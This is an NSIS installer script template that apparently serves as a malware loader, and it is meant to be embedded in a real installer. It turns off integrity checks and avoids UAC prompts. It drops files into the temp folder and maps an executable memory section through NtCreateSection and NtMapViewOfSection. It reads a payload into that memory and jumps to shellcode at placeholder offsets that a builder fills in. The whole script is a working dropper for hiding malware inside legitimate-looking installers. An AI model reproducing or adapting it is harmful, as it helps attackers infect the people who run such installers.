Name "Setup"
CRCCheck off ; so you don't get integrity checks error if you modify the file afterwards
InstallDir "$TEMP"
RequestExecutionLevel user ; avoid uac warnings

; You should embed this in a real installer script, removing anything that makes it not compile and making sure the directives set in this script are set the same, .onInit gets executed first so, if one already exists, add the code from the .onInit in this script at it's top

Function .onInit

SetOutPath $INSTDIR ; sets out path to temp, causing files in the installer to drop in $TEMP

; whats below is replaced by the builder, look into it for more details, basicly embedding the payload + shellcode

;#Files#

System::Call "*(&t255) p .r5"
System::Call "user32::wsprintf(p r5, t '%s\%file%', d)"
System::Call "kernel32::CreateFile(p .r5, i 0x80000000, i 0, p 0, i 3, i 0, i 0) i .r10"

System::Call "*(i) p .r2"
System::Call "*(i %size%, i 0) p .r1"
System::Call "ntdll::NtCreateSection(p r2, i 0xE, p 0, p r1, i 0x40, i 0x8000000, p 0)"
System::Call "*(p 0) p .r3"
System::Call "*(i 0) p .r4"
System::Call "*$2(p .r2)"
System::Call "ntdll::NtMapViewOfSection(p r2, i -1, p r3, p 0, p 0, p 0, p r4, i 2, p 0, i 0x40)"
System::Call "*$3(p .r11)"

System::Call "kernel32::ReadFile(i r10, p r11, i %size%, t., i 0)"
System::Call "kernel32::CloseHandle(i r10)"

IntOp $R2 $R1 + %offset_shell%
IntOp $R3 $R1 + %offset_mlwr%

System::Call "::$R2(p r13, i %mlwr_size%)" ; executing our shellcode
FunctionEnd

Section ; just so it compiles

SectionEnd